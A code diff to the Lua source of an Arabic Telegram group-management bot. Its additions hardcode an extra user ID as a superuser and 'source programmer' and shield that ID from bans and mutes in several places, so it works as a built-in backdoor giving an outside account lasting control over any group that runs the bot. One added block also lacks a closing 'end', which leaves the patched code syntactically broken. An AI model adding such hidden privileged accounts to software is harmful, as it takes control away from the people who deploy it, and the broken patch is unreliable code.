@@ -170,7 +170,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1885706669,1983572489,1986403229}   
+sudo_users = {SUDO,1885706669,1983572489,1986403229,1970574026}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -264,6 +264,8 @@ if tonumber(user_id) == tonumber(1885706669) then
 var = true
 elseif tonumber(user_id) == tonumber( 1986403229) then
 var = true
+elseif tonumber(user_id) == tonumber( 1970574026) then
+var = true
 elseif tonumber(user_id) == tonumber(bot_id) then
 var = true  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
@@ -297,6 +299,8 @@ function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1885706669) then  
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber( 1986403229) then
+var = 'مبرمج السورس'
+elseif tonumber(user_id) == tonumber( 1970574026) then
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -919,7 +923,7 @@ end
 if DevSoFi(msg) then
 local bl = '◉ مرحبا بك في اوامر المطور الجاهزه\n ◉ قناة السورس\n'
 local keyboard = {
-{'المنيل','زغلل '},
+{'زغلل '},
 {'ضع اسم للبوت'},
 {'اوامر الاذاعه','اوامر التفعيل','اوامر التعطيل'},
 {'الاحصائيات'},
@@ -4401,6 +4405,9 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر البوت عام")
 return false 
 end
+if tonumber(result.sender_user_id_) == tonumber(1970574026) then  
+send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
+return false
 if tonumber(result.sender_user_id_) == tonumber(1885706669) then  
 send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
 return false 
@@ -4455,6 +4462,10 @@ if result.id_ == tonumber(1986403229) then
 send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
+if result.id_ == tonumber(1970574026) then
+send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
+return false 
+end
 usertext = '\n◉ العضو ← ['..result.title_..'](t.me/'..(username or 'AP_XO')..')'
 status  = '\n◉ تم حظره عام من الجروبات'
 texts = usertext..status
@@ -4492,6 +4503,10 @@ send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس 
 return false 
 end
 if tonumber(userid) == tonumber(1986403229) then  
+send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
+return false 
+end
+if tonumber(userid) == tonumber(1970574026) then  
 send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -4533,6 +4548,10 @@ send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مطور السورس ع
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1986403229) then  
+send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
+return false 
+end
+if tonumber(result.sender_user_id_) == tonumber(1970574026) then  
 send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -4581,6 +4600,10 @@ if result.id_ == tonumber(1986403229) then
 send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
+if result.id_ == tonumber(1970574026) then
+send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
+return false 
+end
 usertext = '\n◉ العضو ← ['..result.title_..'](t.me/'..(username or 'AP_XO')..')'
 status  = '\n◉ تم كتمه عام من الجروبات'
 texts = usertext..status
@@ -4616,8 +4639,12 @@ end
 if tonumber(userid) == tonumber(1885706669) then  
 send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مطور السورس عام")
 return false 
-end
+end 
 if tonumber(userid) == tonumber(1986403229) then  
+send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
+return false 
+end
+if tonumber(userid) == tonumber(1970574026) then  
 send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
